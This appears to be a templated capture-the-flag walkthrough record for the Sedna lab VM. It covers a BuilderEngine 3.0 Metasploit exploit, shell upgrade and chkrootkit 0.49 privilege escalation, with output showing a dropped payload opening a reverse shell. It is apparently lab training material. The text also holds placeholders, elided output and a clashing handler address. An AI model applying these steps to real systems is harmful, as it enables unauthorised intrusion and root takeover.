initial_prompt: The overall task is to penetrate the Sedna VM (target machine at IP 192.168.1.110), escalate privileges, and capture four flags (one for obtaining a shell, one for gaining root access, and two for post-exploitation tasks). This will be achieved using Kali Linux 2024 (attack machine) by following a step-by-step exploitation process.

steps.thought: Identify open ports and services running on the target machine to find potential entry points.
steps.result:
Starting Nmap 7.94 ( https://nmap.org ) at YYYY-MM-DD HH:MM UT

(Port 80 HTTP is identified as a potential entry point.)

steps.thought: Examine the content of the web page served on port 80.
steps.result:
```html Sedna Corp

Welcome to Sedna Corporation

Our site is under construction. Please check back later!

``` The page is basic and mentions BuilderEngine CMS in a comment, hinting at the software used.

steps.result:
BuilderEngine End User License Agreement

This license agreement is a legal agreement between you (either an individual or a single entity) and BuilderEngine Ltd for the BuilderEngine software product identified above, which includes computer software and may include associated media, printed materials, and "online" or electronic documentation ("SOFTWARE PRODUCT").

BuilderEngine Version: 3.0 (Release Date: 2015-XX-XX)

...(additional license text)...
(The content confirms the use of BuilderEngine version 3.0 from 2015.)

steps.thought: Launch Metasploit Framework to use the BuilderEngine exploit.
Find and select the appropriate exploit module for BuilderEngine.
Configure the exploit module with the target machine's IP address.
Execute the configured exploit against the target.

steps.thought: Get a basic system shell from the Meterpreter session to run system commands.
Improve the basic shell to a fully interactive PTY shell using Python.
Read the content of `flag1.txt`.
Explore the `/etc` directory for potential privilege escalation vectors.
List contents of `/etc` to look for interesting directories or files, specifically `chkrootkit`.
steps.result:
... (various files and directories) ...
chkrootkit
... (more files and directories) ...

steps.thought: Investigate the `chkrootkit` directory.
Check the `README` file for `chkrootkit` version details.
steps.result:
chkrootkit version 0.49

This is chkrootkit. Chkrootkit is a tool to locally check for signs of a
rootkit. 
...(other content)...

steps.thought: Exit the Python PTY-spawned Bash shell to return to the basic system shell.
Exit the basic system shell to return to the Meterpreter prompt.
Return to the `msfconsole` prompt to use the chkrootkit exploit, keeping session 1 active.
Choose the local privilege escalation exploit for chkrootkit 0.49.
Specify the active Meterpreter session (session 1) to run this local exploit through.
Execute the chkrootkit exploit to gain root privileges.
steps.result:
[*] Started reverse TCP handler on 127.0.0.1:4433

[*] Session 1: Executing /tmp/.ICE-unix/update: /bin/sh -c "nohup /tmp/payload & disown"
[+] Exploit completed, and new command shell session 2 opened (192.168.1.100:4433 -> 192.168.1.110:RANDOM_PORT3) at YYYY-MM-DD HH:MM:SS Z
